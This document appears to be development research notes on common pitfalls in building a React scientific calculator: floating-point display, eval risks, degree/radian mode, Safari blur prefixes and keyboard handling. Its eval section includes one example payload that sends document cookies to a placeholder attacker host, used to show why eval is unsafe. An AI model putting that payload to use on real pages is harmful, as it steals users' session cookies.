# Pitfalls Research

**Domain:** Scientific Calculator Web App (React + Vite, glassmorphism UI)
**Researched:** 2026-04-09
**Confidence:** HIGH (floating point, eval security, browser compat) / MEDIUM (UX patterns, state design)

---

## Critical Pitfalls

### Pitfall 1: Floating-Point Precision Producing Ugly/Wrong Results

**What goes wrong:**
JavaScript's IEEE 754 double-precision arithmetic produces results like `0.1 + 0.2 = 0.30000000000000004` and `85.13 + 5.96 + 8.44 = 99.52999999999999`. A calculator is the worst possible place to show this — users will immediately notice and lose trust.

**Why it happens:**
Developers use raw JavaScript arithmetic (`+`, `-`, `*`, `/`) assuming it "just works." The underlying IEEE 754 representation of many decimal fractions is infinite in binary, causing precision loss.

**How to avoid:**
Use `math.js` (already the recommended library for expression parsing) which handles precision internally. If raw JS arithmetic is used anywhere, round display output using `parseFloat(result.toPrecision(12))` before rendering, stripping trailing floating-point noise. Never compare floating-point results with `===`.

**Warning signs:**
- Any calculation result showing more than 10 significant digits that weren't in the input
- Results like `2.9999999999` instead of `3`
- Subtraction of nearly-equal numbers yielding non-zero trash digits

**Phase to address:**
Core arithmetic phase — build rounding/formatting into the result display layer from day one. Retrofit is messy.

---

### Pitfall 2: Using `eval()` to Parse Expressions

**What goes wrong:**
The simplest way to evaluate a string like `"2 * (3 + sin(45))"` in JavaScript is `eval()`. It works perfectly in development and is a serious security hole in production — any user-entered string becomes executable JavaScript code.

**Why it happens:**
`eval()` is the obvious one-liner solution and works for simple cases. The risk isn't obvious until malicious input like `eval("fetch('https://evil.com?c='+document.cookie)")` is considered.

**How to avoid:**
Use `math.js` for expression evaluation: `math.evaluate("2 * (3 + sin(45))")`. It sandboxes evaluation, handles operator precedence correctly, supports trig functions natively, and prevents scope access from user input. Zero eval needed.

**Warning signs:**
- Any `eval(`, `new Function(`, or `Function(` call with user-provided strings
- Expression evaluation working "too easily" — it's probably eval under the hood

**Phase to address:**
Core arithmetic phase — the expression evaluator choice is architectural and cannot be swapped out later without rewriting all calculation logic.

---

### Pitfall 3: Missing Degree/Radian Mode Toggle (Silent Wrong Answers)

**What goes wrong:**
JavaScript's `Math.sin()`, `Math.cos()`, `Math.tan()` operate in radians. A user who types `sin(90)` expecting `1` (degrees) gets `0.8939` instead. This is silent — no error is thrown, the result looks plausible, but it's wrong. This is the single most common user complaint about scientific calculator implementations.

**Why it happens:**
Developers test with radian values. The feature is listed as "trig functions" which passes QA without degree mode being explicitly tested.

**How to avoid:**
Build the degree/radian toggle as a first-class UI element alongside the trig buttons — not an afterthought. Implement a conversion wrapper: `degToRad = (x) => x * Math.PI / 180` applied based on the current mode state. Default to degrees mode, as most non-engineering users expect degrees. Display current mode visibly (DEG/RAD indicator).

**Warning signs:**
- `sin(90)` returns anything other than `1` in degree mode
- No visible mode indicator in the UI
- Trig and inverse-trig functions not paired in the same mode context

**Phase to address:**
Trig functions phase — degree/radian mode must be built alongside the trig buttons, not added after.

---

### Pitfall 4: Invalid Expression Crashes Instead of User-Friendly Errors

**What goes wrong:**
Expressions like `2 */5`, `2.4.5 + 1`, `sin()`, or `((3 + 4)` cause the parser to throw an exception. Without a try/catch boundary, the entire React component tree crashes or the display freezes with no feedback.

**Why it happens:**
Happy-path development — devs test valid inputs and never hit the error state. React's default behavior on unhandled errors is to unmount the component tree.

**How to avoid:**
Wrap all expression evaluation in try/catch. Display `"Error"` or a specific message (`"Syntax Error"`, `"Divide by Zero"`) in the result display area. Never let a parse error propagate to React's error boundary — handle it gracefully within the calculation layer. Specifically handle: division by zero, `Infinity`, `NaN`, and malformed expressions.

**Warning signs:**
- Pressing `=` on an incomplete expression causes blank screen or freeze
- `1/0` shows `Infinity` without graceful handling
- No error state exists in the display component's design

**Phase to address:**
Core arithmetic phase — error state is part of the result display contract, not an enhancement.

---

### Pitfall 5: `backdrop-filter` Breaking on Safari Without `-webkit-` Prefix

**What goes wrong:**
The entire glassmorphism aesthetic depends on `backdrop-filter: blur()`. Without the `-webkit-` prefix, the effect silently fails on Safari — users see opaque white/grey boxes instead of frosted glass. This is a critical visual regression since the whole design language breaks.

**Why it happens:**
Chrome/Firefox support the unprefixed property, so it works in development. Safari 18 still requires the `-webkit-backdrop-filter` prefix, and CSS variables do not work with `-webkit-backdrop-filter` (only hardcoded values are accepted).

**How to avoid:**
Always write both properties together:
```css
-webkit-backdrop-filter: blur(12px);
backdrop-filter: blur(12px);
```
Do NOT use CSS custom properties (`var(--blur-amount)`) with the webkit variant — hardcode values in the webkit rule. Add `@supports (backdrop-filter: blur(1px))` fallback that applies a semi-opaque background for non-supporting contexts.

**Warning signs:**
- Only testing in Chrome during development
- CSS variables used for blur values
- No `@supports` fallback for the glass panels

**Phase to address:**
UI/glassmorphism phase — must be built into the base glass panel component from the start.

---

### Pitfall 6: Keyboard Input Conflicting with Browser Shortcuts or Stealing Focus

**What goes wrong:**
Attaching a global `keydown` listener for calculator input (digits, operators, Enter, Backspace) conflicts with browser shortcuts (`Ctrl+R` for refresh, `Backspace` to navigate back), breaks accessibility tab order, and may intercept input when user focus is elsewhere on the page (e.g., interacting with history panel).

**Why it happens:**
The naive approach is `window.addEventListener('keydown', handler)` with no scope checking. Developers test by typing and it works, without realizing the listener fires even when a text field or link is focused.

**How to avoid:**
Scope the keyboard listener to the calculator container via `useEffect` on a ref, or listen on the container element instead of `window`. Guard against modifier keys (`if (e.ctrlKey || e.metaKey) return`). Use `e.preventDefault()` only for keys the calculator explicitly handles. Allow natural browser shortcuts to pass through unhandled.

**Warning signs:**
- `window.addEventListener('keydown', ...)` without modifier key guards
- Backspace navigates the browser back while typing in the calculator
- `Ctrl+C` stops working on the page

**Phase to address:**
Keyboard input phase / interactive polish phase.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| String concatenation state (`displayString`) instead of expression AST | Simple to implement | Impossible to do cursor positioning, editing mid-expression, or undo | MVP only — plan to refactor before adding editing features |
| Hardcoding `Math.sin/cos/tan` directly in button handlers | No dependency on math.js | Recreating evaluation logic per-function; degree/radian mode scattered everywhere | Never — use math.js evaluate() from the start |
| CSS `var()` for backdrop-filter blur values | DRY, easy theming | Breaks silently on Safari's -webkit-backdrop-filter | Never for webkit prefix rule — use hardcoded fallback |
| Storing history as plain strings | Trivially simple | Can't re-run, copy expression, or associate result with expression for display | Acceptable for v1 — store objects `{expression, result, timestamp}` instead, cost is minimal |
| No error boundary on the calculator component | Less boilerplate | Parser exceptions crash the full UI | Never — wrap in try/catch within calculation logic |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| math.js `evaluate()` | Passing raw user display string directly (may include formatted numbers with commas or display symbols) | Sanitize display string to valid math expression before passing to evaluate — strip display-only characters |
| math.js trig in degree mode | Calling `math.evaluate("sin(90)")` and expecting degrees | Use `math.evaluate("sin(90 deg)")` or convert manually: `math.evaluate(\`sin(\${val * Math.PI / 180})\`)` — math.js defaults to radians |
| React state + keyboard events | Setting up listener in component body (re-registers on every render) | Use `useEffect` with empty dependency array and proper cleanup (`return () => removeEventListener(...)`) |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Too many `backdrop-filter` elements stacked | Janky scrolling, dropped frames on mid-range phones | Limit to 2-3 blurred layers per viewport; use a single glass container, not per-button glass | 5+ stacked blur layers on any device; immediately on mobile |
| Animating `backdrop-filter` (e.g., hover transitions on glass buttons) | Frame drops during hover/press interactions | Animate `opacity` or `transform` instead of `backdrop-filter`; use `will-change: transform` on animated elements only | Any animation of backdrop-filter |
| Re-rendering history on every keypress | Slow display update when history is long | Keep history rendering separate from display state; use `React.memo` or `useMemo` for history list | ~50+ history entries without memoization |
| math.js full bundle import | Slow initial load (math.js is ~180KB gzip) | Import only needed functions: `import { evaluate, sin, cos } from 'mathjs'` | First load on slow connections if full bundle is used |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Using `eval()` or `new Function()` to evaluate user expressions | Remote code execution; any user-typed string becomes executable JS | Use math.js `evaluate()` which sandboxes parsing — never eval user input |
| Storing history in `localStorage` without sanitization | XSS if history entries are ever rendered as HTML | Render history entries as text content only (React's default); never `dangerouslySetInnerHTML` with history data |
| No input length limit on expression string | DoS via extremely long expression causing parser to hang | Cap expression length at ~200 characters; validate before parsing |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| No visible DEG/RAD mode indicator | Silent wrong answers on every trig calculation; user has no idea what mode they're in | Persistent mode badge in the display area, always visible — not hidden in a settings menu |
| History panel auto-scrolls to top on new entry instead of bottom | User loses context of the most recent calculation | Auto-scroll history panel to bottom on new entry (latest entry always visible) |
| No way to reuse a history entry | Users must retype previous calculations | Tap/click on history entry populates the display input |
| Display shows full expression string while typing but truncates | Long expressions become unreadable mid-entry | Scrollable single-line display or show only the last N characters |
| Pressing `=` multiple times replays last operation (like a real calculator) but unexpectedly | Users pressing enter/= after seeing result accidentally chain operations | Show clear visual state difference between "result displayed" and "entering expression" |
| Glass buttons are low contrast on light backgrounds | Buttons hard to read in bright environments | Use `text-shadow` and minimum contrast ratio 4.5:1 between button label and glass background |

---

## "Looks Done But Isn't" Checklist

- [ ] **Floating point:** Test `0.1 + 0.2` — result should display as `0.3`, not `0.30000000000000004`
- [ ] **Trig degree mode:** Test `sin(90)` in DEG mode — should return exactly `1`
- [ ] **Safari glassmorphism:** Open in Safari — frosted glass must render, not opaque fallback
- [ ] **Keyboard input:** Press `Ctrl+R` while using keyboard input — browser should refresh, not send `R` to calculator
- [ ] **Error handling:** Type `2 */3` and press `=` — should show `Error`, not crash or freeze
- [ ] **Division by zero:** Type `5 / 0` and press `=` — should show `Error` or `Undefined`, not `Infinity`
- [ ] **History scrolling:** Add 20+ history entries — newest entry should be visible without manual scrolling
- [ ] **Mobile:** Test on an actual mid-range Android device — glass effects should not cause visible lag
- [ ] **Inverse trig:** `asin(1)` in DEG mode should return `90`, not `1.5707...`
- [ ] **Parenthesis balancing:** Open a paren and evaluate — should show an error, not silently evaluate wrong result

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Floating-point precision baked in everywhere | HIGH | Introduce result-formatting utility; patch all display call sites; regression test all operations |
| eval() used for expression evaluation | HIGH | Replace with math.js evaluate() throughout; sanitize all expression paths; security audit |
| Missing degree/radian mode | MEDIUM | Add mode state and conversion wrapper; update all trig button handlers; add UI indicator |
| Safari backdrop-filter missing prefix | LOW | Add -webkit- prefix to all glass components; test in Safari; 30-min fix |
| Global keyboard listener conflicts | MEDIUM | Refactor to scoped listener; audit all keydown handlers; test browser shortcuts |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Floating-point display | Core arithmetic (first phase) | `0.1 + 0.2` displays `0.3` |
| eval() expression parsing | Core arithmetic (first phase) | Code review: zero `eval` calls in codebase |
| Degree/radian mode | Trig functions phase | `sin(90)` in DEG = `1`, `sin(π/2)` in RAD = `1` |
| Invalid expression crashes | Core arithmetic (first phase) | `2*/3` shows Error, no React crash |
| Safari backdrop-filter | UI/glassmorphism phase | Manual test in Safari; @supports fallback exists |
| Keyboard input conflicts | Keyboard input / polish phase | `Ctrl+R` refreshes browser; Backspace doesn't navigate back |
| History UX | History panel phase | New entries appear at bottom; tap-to-reuse works |

---

## Sources

- [Avoiding Floating-Point Pitfalls in JavaScript - Sling Academy](https://www.slingacademy.com/article/avoiding-floating-point-pitfalls-in-javascript-calculations/)
- [math.js Expression Parsing Docs](https://mathjs.org/docs/expressions/parsing.html)
- [expr-eval: safer eval alternative](https://github.com/silentmatt/expr-eval)
- [Safari backdrop-filter -webkit- prefix still required (Safari 18)](https://github.com/mdn/browser-compat-data/issues/25914)
- [Can I Use: CSS backdrop-filter](https://caniuse.com/css-backdrop-filter)
- [Glassmorphism Implementation Guide 2025](https://playground.halfaccessible.com/blog/glassmorphism-design-trend-implementation-guide)
- [React Anti-Patterns 2025](https://jsdev.space/react-anti-patterns-2025/)
- [Degree vs Radian mode explained](https://toplearning.blog/radian-vs-degree-trig-calculator-mode-explained-33372)
- [Common calculator app bugs (expression validation)](https://medium.com/@gosagnik/building-a-simple-calculator-with-react-js-65a5a2fb43e2)
- [Web Accessibility - Keyboard Focus](https://web.dev/learn/accessibility/focus)

---
*Pitfalls research for: Scientific Calculator Web App (React + Vite, glassmorphism)*
*Researched: 2026-04-09*
